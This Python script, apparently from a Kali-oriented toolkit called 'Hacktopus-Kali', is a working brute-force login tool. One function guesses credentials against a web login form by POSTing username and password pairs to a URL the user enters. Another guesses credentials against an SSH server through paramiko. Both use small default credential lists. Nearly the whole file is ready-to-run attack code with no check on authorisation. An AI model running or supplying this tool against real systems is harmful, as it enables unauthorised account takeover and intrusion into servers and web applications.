import requests
import paramiko
from time import sleep

# Web Login Brute Forcer
def web_login_bruteforce(url, username_list, password_list):
    print("\n🔍 Attempting brute force attack on web login...")

    for username in username_list:
        for password in password_list:
            print(f"Testing with Username: {username} and Password: {password}")
            data = {'username': username, 'password': password}  # Adjust this form according to target
            response = requests.post(url, data=data)
            if "Login successful" in response.text:  # You need to adjust this based on response after successful login
                print(f"✅ Found valid credentials: {username}:{password}")
                return username, password
            sleep(1)

    print("⚠ Brute force failed on web login!")
    return None, None

# SSH Login Brute Forcer
def ssh_login_bruteforce(host, username_list, password_list):
    print("\n🔍 Attempting brute force attack on SSH login...")

    for username in username_list:
        for password in password_list:
            print(f"Testing with Username: {username} and Password: {password}")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(host, username=username, password=password, timeout=5)
                print(f"✅ Found valid credentials: {username}:{password}")
                client.close()
                return username, password
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                print(f"⚠ Error: {e}")
            finally:
                sleep(1)

    print("⚠ Brute force failed on SSH login!")
    return None, None

# Main Function
def main():
    print("\n🎩 Hacktopus-Kali - Brute Force Login Tester")

    # Web Login Brute Force Example
    url = input("Enter the target URL (e.g., http://example.com/login): ")
    username_list = ['admin', 'user', 'guest']
    password_list = ['12345', 'password', 'admin']
    web_login_bruteforce(url, username_list, password_list)

    # SSH Login Brute Force Example
    host = input("Enter the SSH target host (e.g., 192.168.1.100): ")
    username_list = ['root', 'admin', 'user']
    password_list = ['root', 'admin', 'password']
    ssh_login_bruteforce(host, username_list, password_list)

if __name__ == "__main__":
    main()

